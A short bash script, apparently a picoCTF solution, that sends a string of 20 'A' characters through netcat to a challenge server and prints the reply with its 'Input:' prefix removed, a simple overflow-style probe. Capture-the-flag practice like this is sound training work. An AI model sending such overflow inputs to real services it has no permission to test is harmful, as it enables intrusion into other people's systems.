#!/bin/bash

output=$(python3 -c "print('A'*20)" | nc saturn.picoctf.net 65355)

echo ${output#Input:}